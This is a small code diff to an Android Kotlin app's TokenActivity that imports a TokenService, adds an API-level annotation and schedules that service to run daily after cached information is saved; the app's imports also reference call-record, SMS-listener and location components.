@@ -8,6 +8,7 @@ import an.xuan.tong.historycontact.api.model.InformationResponse
 import an.xuan.tong.historycontact.call.CallRecord
 import an.xuan.tong.historycontact.location.LocationService
 import an.xuan.tong.historycontact.realm.RealmUtils
+import an.xuan.tong.historycontact.service.TokenService
 import an.xuan.tong.historycontact.smsradar.Sms
 import an.xuan.tong.historycontact.smsradar.SmsListener
 import an.xuan.tong.historycontact.smsradar.SmsRadar
@@ -20,6 +21,7 @@ import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
+import android.support.annotation.RequiresApi
 import android.support.v4.app.ActivityCompat
 import android.support.v4.content.ContextCompat
 import android.util.Log
@@ -172,6 +174,7 @@ class TokenActivity : Activity() {
 
     }
 
+    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
     fun handlerGetInformationSccess(listData: InformationResponse) {
         //call service
         startCallService()
@@ -183,6 +186,7 @@ class TokenActivity : Activity() {
             initializeSmsRadarService()
         }
         RealmUtils.saveCacheInformation(listData)
+        TokenService.schedule(this, TokenService.ONE_DAY_INTERVAL)
     }
 
     private fun permissionApp() {
